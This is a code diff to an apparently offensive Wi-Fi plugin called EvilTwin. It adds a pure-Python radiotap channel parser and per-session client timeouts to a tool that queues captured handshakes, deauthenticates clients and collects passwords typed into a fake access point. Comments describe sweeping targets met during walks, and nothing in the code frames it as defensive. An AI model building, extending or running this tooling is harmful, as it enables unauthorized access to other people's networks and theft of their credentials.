@@ -200,15 +200,86 @@ def _submit(password):
 
 
 def _channel_from_pcap(pcap_path):
+    """Extract the 2.4 GHz channel from a pcap's radiotap header.
+
+    Uses Python struct only — no tshark / external tools required.
+    Returns 6 on any failure (safe default for wlan0 which is 2.4 GHz only).
+    """
+    import struct as _struct
+
+    def _freq_to_channel(freq):
+        # 2.4 GHz band only — wlan0 (Pi built-in) cannot do 5 GHz
+        if 2412 <= freq <= 2484:
+            return (freq - 2407) // 5
+        return None
+
     try:
-        r = subprocess.run(
-            ["tshark", "-r", pcap_path, "-Y", "wlan.fc.type_subtype==8",
-             "-T", "fields", "-e", "wlan_radio.channel", "-c", "1"],
-            capture_output=True, text=True, timeout=10
-        )
-        ch = r.stdout.strip()
-        if ch and ch.isdigit():
-            return int(ch)
+        with open(pcap_path, 'rb') as fh:
+            # --- PCAP global header (24 bytes) ---
+            gh = fh.read(24)
+            if len(gh) < 24:
+                return 6
+            magic = _struct.unpack('<I', gh[:4])[0]
+            if magic == 0xa1b2c3d4:
+                bo = '<'
+            elif magic == 0xd4c3b2a1:
+                bo = '>'
+            else:
+                return 6   # not a pcap or byte-swapped pcap-ng
+            link_type = _struct.unpack(bo + 'I', gh[20:24])[0]
+            if link_type != 127:   # 127 = LINKTYPE_IEEE802_11_RADIOTAP
+                return 6
+
+            # --- Scan up to first 5 frames for channel info ---
+            for _ in range(5):
+                rec = fh.read(16)
+                if len(rec) < 16:
+                    break
+                incl_len = _struct.unpack(bo + 'I', rec[8:12])[0]
+                raw = fh.read(min(incl_len, 512))
+                if len(raw) < 8:
+                    fh.seek(max(0, incl_len - len(raw)), 1)
+                    continue
+
+                # --- Radiotap header ---
+                rt_len = _struct.unpack('<H', raw[2:4])[0]
+                if rt_len < 8 or rt_len > len(raw):
+                    continue
+
+                # Read all present bitmaps (bit 31 = more bitmaps follow)
+                bitmaps, bm_off = [], 4
+                while bm_off + 4 <= rt_len:
+                    bm = _struct.unpack('<I', raw[bm_off:bm_off + 4])[0]
+                    bitmaps.append(bm)
+                    bm_off += 4
+                    if not (bm & (1 << 31)):
+                        break
+
+                first = bitmaps[0] if bitmaps else 0
+                if not (first & (1 << 3)):  # Channel bit not set
+                    continue
+
+                # Field data starts after all present bitmaps
+                off = 4 + 4 * len(bitmaps)
+
+                # Walk fields 0-2 that precede Channel (bit 3)
+                # (bit, size, alignment)
+                for bit, size, align in ((0, 8, 8),   # TSFT
+                                         (1, 1, 1),   # Flags
+                                         (2, 1, 1)):  # Rate
+                    if first & (1 << bit):
+                        if align > 1 and off % align:
+                            off += align - (off % align)
+                        off += size
+
+                # Channel field: 2-byte freq + 2-byte flags, aligned to 2
+                if off % 2:
+                    off += 1
+                if off + 2 <= rt_len and off + 2 <= len(raw):
+                    freq = _struct.unpack('<H', raw[off:off + 2])[0]
+                    ch = _freq_to_channel(freq)
+                    if ch:
+                        return ch
     except Exception:
         pass
     return 6
@@ -520,12 +591,16 @@ class EvilTwin(plugins.Plugin):
         except Exception:
             return
         queued = 0
+        # Startup sessions use a shorter client_timeout — the target devices
+        # are probably not nearby (we're at home after a walk), so don't waste
+        # much time waiting.  Configurable via startup_client_timeout.
+        st_timeout = int(self.options.get("startup_client_timeout", 20))
         for pcap in sorted(pcaps):
             if _already_cracked(pcap):
                 continue
             ssid = _ssid_from_filename(pcap)
             try:
-                self._q.put_nowait((ssid, pcap))
+                self._q.put_nowait((ssid, pcap, st_timeout))
                 queued += 1
             except queue.Full:
                 break
@@ -552,7 +627,10 @@ class EvilTwin(plugins.Plugin):
             )
             return
         try:
-            self._q.put_nowait((ssid, filename))
+            # Live captures use the configured client_timeout (default 60s)
+            # so there's enough time for deauth + client reconnect.
+            ct = int(self.options.get("client_timeout", 60))
+            self._q.put_nowait((ssid, filename, ct))
             logging.info("[evil_twin] queued evil twin for '%s'", ssid)
         except queue.Full:
             logging.warning("[evil_twin] queue full — skipping '%s'", ssid)
@@ -560,13 +638,14 @@ class EvilTwin(plugins.Plugin):
     def _loop(self):
         while self._running:
             try:
-                ssid, pcap = self._q.get(timeout=5)
+                ssid, pcap, client_timeout = self._q.get(timeout=5)
             except queue.Empty:
                 continue
             if not os.path.exists(pcap):
                 logging.warning("[evil_twin] pcap gone: %s", pcap)
                 continue
-            logging.info("[evil_twin] starting session for '%s'", ssid)
+            logging.info("[evil_twin] starting session for '%s' (client_timeout=%ds)",
+                         ssid, client_timeout)
             self._session = _Session(
                 ssid=ssid,
                 pcap=pcap,
@@ -578,7 +657,7 @@ class EvilTwin(plugins.Plugin):
                 deauth_rounds=int(self.options.get("deauth_rounds", 3)),
                 deauth_interval=int(self.options.get("deauth_interval", 15)),
                 on_captured=lambda s, pw: self._captured(s, pw, pcap),
-                client_timeout=int(self.options.get("client_timeout", 60)),
+                client_timeout=client_timeout,
                 session_timeout=int(self.options.get("session_timeout", 300)),
             )
             try:
